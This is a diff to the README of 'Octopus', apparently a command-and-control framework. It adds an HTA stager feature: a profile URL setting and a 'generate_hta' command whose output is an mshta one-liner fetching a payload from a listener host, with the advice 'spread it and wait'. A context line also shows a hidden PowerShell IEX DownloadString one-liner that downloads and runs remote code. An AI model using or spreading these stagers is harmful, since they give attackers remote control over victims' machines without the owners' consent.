@@ -160,6 +160,8 @@ first_ping_url = "/login"
 # will return in every response as Server header
 server_response_header = "nginx"
 
+# will return white page that includes HTA script
+mshta_url="/hta"
 
 ```
 
@@ -284,6 +286,24 @@ powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://192.
 ```
 
 Now we can use this oneliner to start our agent.
+
+**HTA oneliner**
+
+To generate a HTA oneliner for the listener1 `operation1` we can use the following command:
+
+`generate_hta operation1`
+
+and we will get the following results:
+
+```
+Octopus >>generate_hta operation1
+#====================
+mshta http://192.168.178.1:8080/hta
+spread it and wait ;)
+#====================
+Octopus >>
+```
+Please note that you can edit the `/hta` URL using `profile.py`
 
 **Octopus EXE agent**
 
